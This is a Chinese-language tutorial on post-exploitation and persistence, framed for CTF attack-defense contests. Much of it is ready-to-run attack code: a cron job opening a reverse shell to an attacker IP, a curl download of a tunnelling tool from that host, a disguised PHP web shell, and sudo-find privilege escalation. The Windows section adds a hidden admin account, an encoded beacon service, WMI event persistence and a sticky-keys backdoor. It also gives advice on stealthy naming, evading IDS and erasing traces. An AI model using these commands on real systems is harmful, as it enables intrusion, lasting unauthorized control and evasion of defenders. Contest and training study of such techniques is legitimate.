# 后渗透与持久化

## 1. 概述

后渗透（Post-Exploitation）是在获得初始访问权限后进行的持续控制、信息收集和横向扩展阶段。在CTF Attack-Defense模式中，后渗透的核心目标是：(1) 维持对已攻破主机的持久控制，(2) 建立稳定的C2（Command & Control）通道，(3) 部署隐蔽的代理隧道访问内网，(4) 收集尽可能多的凭证与数据。本节涵盖持久化技术、C2框架基础、隧道与代理、免杀基础等核心内容。

## 2. 核心原理

### 2.1 后渗透阶段的战略目标

```
后渗透生命周期:

1. 初始据点加固
   ├── 升级Shell到交互式/加密通道
   ├── 建立持久化机制（防止Shell丢失）
   └── 提权（获取最高权限）

2. 态势感知
   ├── 全面主机侦察（系统/网络/用户/服务）
   ├── 凭证收集（密码、哈希、票据、密钥）
   └── 环境感知（所在位置、网络拓扑）

3. 横向扩展
   ├── 内网发现与扫描
   ├── 横向移动（利用收集的凭证）
   └── 重复步骤1-3

4. 数据收集
   ├── Flag定位与提取
   ├── 敏感文件搜索
   └── 比赛策略所需数据

5. 痕迹清理（A/D模式关键）
   ├── 清理操作日志
   ├── 隐藏持久化机制
   └── 反溯源对抗
```

### 2.2 C2通信模型

```
C2架构模式对比：

1. 直接连接（标准反向Shell）
   目标 → 攻击机:4444
   优点：简单直接
   缺点：容易被防火墙阻止，IP暴露

2. 跳板转发（SSH隧道/端口转发）
   目标 → 跳板机 → 攻击机
   优点：隐藏攻击机IP
   缺点：跳板是单点故障

3. 代理链（多层转发）
   目标 → 代理1 → 代理2 → ... → 攻击机
   优点：高度隐蔽
   缺点：延迟大，配置复杂

4. 出站HTTPS/DNS（协议伪装）
   目标 → HTTPS → 攻击C2服务器
   优点：绕过大多数防火墙
   缺点：需要TLS证书配置

5. P2P/BTCP2P（点对点）
   各目标之间互相通信
   优点：去中心化
   缺点：实现复杂
```

## 7. 实战示例

### 7.1 完整后渗透攻击链

**场景：** CTF A/D比赛中，通过Web漏洞获得了 `www-data` Shell，需要建立持久化和C2通道。

```bash
# === 阶段1: Shell升级 ===
# 初始基础Shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm-256color

# === 阶段2: 信息收集 ===
id  # uid=33(www-data)
sudo -l  # (root) NOPASSWD: /usr/bin/find
# 立即提权（Linux提权章节）
sudo find . -exec /bin/bash -p \; -quit
# 已经是root

# === 阶段3: 持久化部署 ===
# A) SSH密钥
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1..." > /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# B) Cron反向Shell（冗余）
echo "*/5 * * * * root /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.100/5555 0>&1'" >> /etc/crontab

# C) Web Shell作为备用
echo '<?php if(md5($_GET["key"])=="e99a18c428cb38d5f260853678922e03"){system($_GET["cmd"]);} ?>' > /var/www/html/login_cache.php
# 密码: abc123 (MD5 hash验证)

# === 阶段4: C2通道建立 ===
# 从目标发起反向连接
# 方法1: Chisel SOCKS代理
curl -o /tmp/chisel http://10.10.10.100:8000/chisel_linux_amd64
chmod +x /tmp/chisel
/tmp/chisel client 10.10.10.100:8000 R:1080:socks &

# === 阶段5: 内网横向 ===
# 通过Chisel SOCKS代理访问内网
proxychains4 nmap -sT -Pn -p 22,80,443,445,3306 192.168.1.0/24

# 发现MySQL (192.168.1.50:3306)
proxychains4 mysql -h 192.168.1.50 -u root -proot123
# 连接成功！
# 在数据库中找到: user表 → admin:password123

# SSH登陆内网主机
proxychains4 ssh root@192.168.1.50

# 读取Flag
cat /root/flag.txt
# CTF{Post_Exploitation_Chain_Done}
```

### 7.2 Windows环境持久化

```powershell
# 已经获得Win10目标机的SYSTEM权限

# 1. 创建隐藏管理员账户
net user sysadmin P@ssw0rd123! /add
net localgroup Administrators sysadmin /add
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v sysadmin /t REG_DWORD /d 0 /f
# 注册表DWORD=0使账户在登录界面不可见

# 2. 安装持久服务
sc create "WindowsUpdateSvc" binPath= "cmd.exe /c powershell -enc <BASE64_BEACON>" start= auto
sc start "WindowsUpdateSvc"

# 3. WMI事件持久化（难检测）
# 每30分钟触发一次
$filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{Name="TrigFilter"; EventNameSpace="root\cimv2"; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 1800 WHERE TargetInstance ISA 'Win32_LocalTime'"}
$consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{Name="TrigConsumer"; CommandLineTemplate="powershell -enc <BASE64>"}
Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer}

# 4. RDP Sticky Keys 后门
copy /y cmd.exe sethc.exe.backup
takeown /f C:\Windows\System32\sethc.exe
icacls C:\Windows\System32\sethc.exe /grant Everyone:F
copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
# RDP登录时按Shift五次 → NT AUTHORITY\SYSTEM cmd
```

## 8. 常见误区与注意事项

- **误区1：持久化只部署一种。** 在CTF A/D中，其他队伍可能清理你的持久化，需要多种冗余机制。
- **误区2：持久化文件使用明显文件名。** 如 `shell.php`, `backdoor.exe` 极易被发现。应该伪装成系统文件，如 `libcurl.so.4`, `svchost_win.exe`。
- **误区3：使用明文C2通信。** SDN/IDS可能检测明文C2流量。推荐使用HTTPS/SSL/TLS/SSH加密通道。
- **误区4：持久化触发过于频繁。** Cron每分钟执行一次反向连接容易触发防火墙规则和日志告警。每30分钟或每天触发更隐蔽。
- **误区5：Shellcode直接落地。** 尽量使用内存加载或LotL（Living off the Land）技术。
- **注意：A/D模式中，防御方可能在你的主机上做同样的事情（反制）。请为你的持久化添加访问控制和密码保护。**

## 9. 相关知识点

- **LotL (Living off the Land):** 使用系统自带工具进行攻击（certutil, bitsadmin, mshta, regsvr32）
- **进程镂空 (Process Hollowing):** 将恶意代码注入到挂起的合法进程中
- **DLL侧加载 (DLL Side-Loading):** 利用合法应用程序加载恶意DLL
- **Persistence via BITS:** 使用BITSAdmin后台智能传输服务持久化
- **Office宏持久化:** 通过Office模板或加载项
- **MFA/2FA绕过:** 针对多因素认证的攻击
- **反取证技术:** 时间戳修改、日志注入、Alternate Data Streams (ADS)
